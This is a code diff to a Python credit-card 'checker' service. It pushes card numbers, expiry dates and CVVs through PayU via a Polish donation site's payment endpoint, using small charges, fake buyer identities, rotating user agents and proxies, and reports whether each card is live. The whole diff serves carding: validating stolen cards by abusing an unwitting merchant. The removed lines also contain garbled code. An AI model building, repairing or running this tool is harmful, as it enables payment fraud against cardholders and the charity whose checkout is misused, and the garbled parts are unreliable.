@@ -27,8 +27,6 @@ def _random_ua():
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
     ]
     return random.choice(versions)
 
@@ -71,7 +69,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via Large Healthcare Merchant"""
+    """Synchronous PayU charge check via Centaurus API"""
     session = requests.Session()
     try:
         email = _random_email()
@@ -87,54 +85,53 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via Healthcare Merchant ───
+        # ─── Step 1: Create order via Centaurus REST API ───
         headers1 = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://w ospita-l.eu', # Dihapus space untuk elak error
-            'referer': 'https://wospita-l.eu/platnosci/',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/json',
+            'origin': 'https://beta3.centaurus.org.pl',
+            'referer': 'https://beta3.centaurus.org.pl/payu/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
             'user-agent': ua,
         }
 
-        data1 = {
-            'amount': '10.00',
-            'description': 'Wpłata',
-            'email': email,
-            'firstname': name.split()[0],
-            'lastname': name.split()[1],
+        # Struktur JSON yang dijangkakan oleh sistem ini
+        payload1 = {
+            "amount": 500, # 5.00 PLN
+            "description": "Donation",
+            "email": email,
+            "firstName": name.split()[0],
+            "lastName": name.split()[1]
         }
 
-        r1 = session.post('https://wospita-l.eu/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        r1 = session.post('https://beta3.centaurus.org.pl/payu/create', headers=headers1, json=payload1, timeout=30)
 
-        order_id = None
-        token = None
+        try:
+            res1 = r1.json()
+        except Exception:
+            return 'Failed to parse JSON from Centaurus', {"raw": r1.text, "status_code": r1.status_code}
 
-        if 'Location' in r1.headers:
-            loc = r1.headers['Location']
-            oid = re.search(r'orderId=([^&]+)', loc)
-            tok = re.search(r'token=([^&]+)', loc)
-            if oid: order_id = oid.group(1)
-            if tok: token = tok.group(1)
+        # Cuba ekstrak orderId dan token dari response JSON
+        order_id = res1.get('orderId') or res1.get('order_id')
+        token = res1.get('token') or res1.get('payu_token')
+
+        # Kalau tak jumpa terus, mungkin dia return redirect URL
+        if not order_id or not token:
+            redirect = res1.get('redirectUri') or res1.get('redirect_url') or res1.get('url') or ''
+            if redirect:
+                oid = re.search(r'orderId=([^&]+)', redirect)
+                tok = re.search(r'token=([^&]+)', redirect)
+                if oid: order_id = oid.group(1)
+                if tok: token = tok.group(1)
 
         if not order_id or not token:
-            body = r1.text
-            oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
-            tok = re.search(r'token["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
-            if oid and not order_id: order_id = oid.group(1)
-            if tok and not token: token = tok.group(1)
-
-        if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
+            return 'Failed to extract orderId or token', {"error": "Missing keys in JSON", "raw_response": res1}
 
         # ─── Step 2: Load PayU pay page ───
         params2 = {'orderId': order_id, 'token': token}
@@ -144,7 +141,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://wospita-l.eu/',
+            'referer': 'https://beta3.centaurus.org.pl/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -158,7 +155,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        final_amount = 1000 # Default 10.00 PLN
+        final_amount = 500 
         final_currency = 'PLN'
         
         try:
@@ -175,12 +172,11 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'authorization': f'Bearer {token}',
-            'content-type': 'application/create+json',
+            'content-type': 'application/json',
             'origin': 'https://secure.payu.com',
             'priority': 'u=1, i',
             'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-create': 'cors',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'empty',
@@ -226,7 +222,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'firstName': name.split()[0],
             'lastName': name.split()[1],
             'currency': final_currency,
-            'amount': URL(taip) if final_amount else 1000,
+            'amount': final_amount,
             'payMethod': {
                 'type': 'c',
                 'token': card_token,
@@ -255,7 +251,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         except Exception:
             try:
                 pay_data = json.loads(r4.text)
-        except Exception:
+            except Exception:
                 pay_data = {"raw": r4.text, "status_code": r4.status_code}
 
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
@@ -264,11 +260,11 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         continue_url = pay_data.get('continueUrl')
 
-        # ─── Step 5: Poll for result ┅──
+        # ─── Step 5: Poll for result ───
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
-            final_status = _poll_status(session, manjakan, order_id, token, ua, max_attempts=3, delay=2)
+            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)
 
         category = final_status.get('category', '')
         value = final_status.get('value', '')
@@ -303,7 +299,7 @@ def check_card(cc: str = Query(...)):
     try:
         message, raw_data = _payu_sync(card_num, mm, yy, cvv_code)
         return {
-            "message": warga,
+            "message": message,
             "raw": raw_data
         }
     except Exception as e:
